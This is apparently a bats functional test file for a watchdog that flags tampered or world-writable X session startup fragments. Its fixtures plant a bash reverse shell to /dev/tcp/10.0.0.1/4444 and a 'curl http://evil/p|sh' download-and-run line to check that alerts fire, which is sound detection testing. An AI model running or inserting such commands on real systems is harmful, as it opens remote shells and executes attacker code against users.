#!/usr/bin/env bats
# L2 bats functional tests for the xsession-watchdog scan script.
#
# The display manager SOURCES the scripts in /etc/X11/Xsession.d (and
# xinit/xinitrc.d) plus the top-level Xsession files AS THE LOGGING-IN USER
# on every graphical login — a per-graphical-login exec surface. A planted
# fragment that is world-writable / non-root-owned, or contains a command-
# injection pattern, is alert (T1546).
#
# Run with: bats packaging/test/L2-xsession-watchdog.bats

WD="${BATS_TEST_DIRNAME}/../../modules/xsession-watchdog/systemd/xsession-watchdog.sh"
LIB="${BATS_TEST_DIRNAME}/../lib/module-lib.sh"

setup() {
    TMP="$(mktemp -d)"
    BIN="${TMP}/bin"; mkdir -p "${BIN}"
    cat > "${BIN}/logger" <<'FAKELOGGER'
#!/usr/bin/env bash
printf '%s\n' "$*" >> "${SELFDEF_TEST_LOGCAP}"
FAKELOGGER
    chmod +x "${BIN}/logger"
    export SELFDEF_TEST_LOGCAP="${TMP}/log.out"
    : > "${SELFDEF_TEST_LOGCAP}"
    BASELINE="${TMP}/baseline.tsv"
    HOOKD="${TMP}/Xsession.d"; mkdir -p "${HOOKD}"
}

teardown() { rm -rf "${TMP}"; }

run_wd() {
    PATH="${BIN}:${PATH}" \
    SELFDEF_MODULE_LIB="${LIB}" \
    SELFDEF_XSESSION_PROFILE="${PROFILE:-report}" \
    SELFDEF_XSESSION_BASELINE="${BASELINE}" \
    SELFDEF_XSESSION_DIRS="${DIRS_V:-$HOOKD}" \
    SELFDEF_XSESSION_FILES="${TMP}/no-extra-file" \
    bash "${WD}"
}

cap() { cat "${SELFDEF_TEST_LOGCAP}"; }

seed_benign() {
    printf '#!/bin/sh\n# 90benign\nexport LANG="$LANG"\n' > "${HOOKD}/90benign"
}

@test "no xsession fragments → ok / no_xsession" {
    DIRS_V="${TMP}/empty" run_wd
    cap | grep -q '"event":"no_xsession"'
    cap | grep -q '"severity":"ok"'
}

@test "benign fragment, first run → ok / baseline_initial" {
    seed_benign
    run_wd
    cap | grep -q '"event":"baseline_initial"'
    cap | grep -q '"severity":"ok"'
    [ -f "${BASELINE}" ]
}

@test "unchanged fragments on second run → ok / xsession_intact" {
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"xsession_intact"'
    cap | grep -q '"severity":"ok"'
}

@test "a fragment with an injection pattern → alert / xsession_suspicious" {
    seed_benign
    run_wd
    printf '#!/bin/sh\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n' > "${HOOKD}/90benign"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"xsession_suspicious"'
    cap | grep -q '"severity":"alert"'
}

@test "a world-writable fragment → alert" {
    seed_benign
    run_wd
    chmod 0666 "${HOOKD}/90benign"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "a benign fragment change → warn / xsession_changed" {
    seed_benign
    run_wd
    printf '#!/bin/sh\n# 90benign updated\nexport LANG="${LANG:-C}"\n' > "${HOOKD}/90benign"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -qE '"event":"xsession_changed"'
    cap | grep -q '"severity":"warn"'
}

@test "a benign root-owned fragment is NOT flagged" {
    seed_benign
    run_wd
    ! cap | grep -q '"severity":"alert"'
    cap | grep -q '"severity":"ok"'
}

@test "missing module-lib → alert / module_lib_missing + non-zero exit" {
    seed_benign
    LIB="${TMP}/nonexistent-module-lib.sh" run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"event":"module_lib_missing"'
    cap | grep -q '"severity":"alert"'
}

@test "enforce profile exits non-zero on a suspicious fragment" {
    seed_benign
    run_wd
    printf '#!/bin/sh\ncurl http://evil/p|sh\n' > "${HOOKD}/90benign"
    : > "${SELFDEF_TEST_LOGCAP}"
    PROFILE=enforce run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"severity":"alert"'
}
